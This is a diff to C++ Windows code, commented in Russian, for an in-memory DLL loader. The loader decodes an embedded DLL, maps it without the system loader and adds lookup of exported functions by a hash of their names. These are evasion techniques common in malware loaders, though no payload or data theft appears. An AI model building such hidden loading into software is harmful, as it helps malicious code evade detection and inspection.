@@ -408,6 +408,50 @@ FARPROC MemoryGetProcAddress(HMEMORYMODULE module, const char *name)
 	return (FARPROC)(codeBase + *(DWORD *)(codeBase + exports->AddressOfFunctions + (idx*4)));
 }
 
+
+//---------------------------------------------------
+//  Функция возвращает адрес экспортируемо функции
+//  по хэшу её имени
+//---------------------------------------------------
+FARPROC MemoryGetProcAddress(HMEMORYMODULE module, DWORD NameHash)
+{
+	if (!module) return NULL;
+
+	unsigned char *codeBase = ((PMEMORYMODULE)module)->codeBase;
+	int idx=-1;
+	DWORD i, *nameRef;
+	WORD *ordinal;
+	PIMAGE_EXPORT_DIRECTORY exports;
+	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY((PMEMORYMODULE)module, IMAGE_DIRECTORY_ENTRY_EXPORT);
+	if (directory->Size == 0)
+		return NULL;
+
+	exports = (PIMAGE_EXPORT_DIRECTORY)(codeBase + directory->VirtualAddress);
+	if (exports->NumberOfNames == 0 || exports->NumberOfFunctions == 0)
+		return NULL;
+
+	nameRef = (DWORD *)(codeBase + exports->AddressOfNames);
+	ordinal = (WORD *)(codeBase + exports->AddressOfNameOrdinals);
+
+	for (i=0; i<exports->NumberOfNames; i++, nameRef++, ordinal++)
+		if (STRA::Hash((PCHAR)(codeBase + *nameRef)) == NameHash)
+		{
+			idx = *ordinal;
+			break;
+		}
+
+	if (idx == -1)
+		return NULL;
+
+	if ((DWORD)idx > exports->NumberOfFunctions)
+		return NULL;
+
+	return (FARPROC)(codeBase + *(DWORD *)(codeBase + exports->AddressOfFunctions + (idx*4)));
+}
+//----------------------------------------------------------------------------
+
+
+
 #pragma optimize("", off)
 bool BuildImport(PVOID ImageBase)
 {
@@ -441,17 +485,7 @@ bool BuildImport(PVOID ImageBase)
 TMemoryDLL::TMemoryDLL(const void* DllBuf)
 {
 	FHandle = NULL;
-
-	DWORD Size;
-	bool Allocated;
-	LPVOID NewBuf;
-
-	if (!DecodeDll(DllBuf, Size, NewBuf, Allocated)) return;
-
-    FHandle = MemoryLoadLibrary(NewBuf);
-
-	if (Allocated)
-        MemFree(NewBuf);
+    Load(DllBuf);
 }
 //----------------------------------------------------------------------------
 
@@ -460,6 +494,26 @@ TMemoryDLL::~TMemoryDLL()
 {
 	if (FHandle)
 		MemoryFreeLibrary(FHandle);
+}
+//----------------------------------------------------------------------------
+
+bool TMemoryDLL::Load(const void* DllBuf)
+{
+	if (FHandle || ! DllBuf) return false;
+
+	DWORD Size;
+	bool Allocated;
+	LPVOID NewBuf;
+
+	if (!DecodeDll(DllBuf, Size, NewBuf, Allocated))
+		return false;
+
+    FHandle = MemoryLoadLibrary(NewBuf);
+
+	if (Allocated)
+		MemFree(NewBuf);
+
+	return FHandle != NULL;
 }
 //----------------------------------------------------------------------------
 
@@ -473,12 +527,27 @@ LPVOID TMemoryDLL::GetProcAddress(const char* Name)
 }
 //----------------------------------------------------------------------------
 
+LPVOID TMemoryDLL::GetProcAddress(DWORD NameHash)
+{
+	// Функция возвращает адрес экспортируемо ункции по её хэшу
+	return (FHandle) ? (LPVOID)MemoryGetProcAddress(FHandle, NameHash) : NULL;
+}
+//----------------------------------------------------------------------------
+
 bool TMemoryDLL::GetProcAddress(const char* Name, LPVOID &Addr)
 {
 	Addr = GetProcAddress(Name);
 	return Addr != NULL;
 }
+//----------------------------------------------------------------------------
 
+bool TMemoryDLL::GetProcAddress(DWORD NameHash, LPVOID &Addr)
+{
+	Addr = GetProcAddress(NameHash);
+	return Addr != NULL;
+}
+
+//----------------------------------------------------------------------------
 
 //---------------------------------------------------------
 //  Функция расшифровывает длл
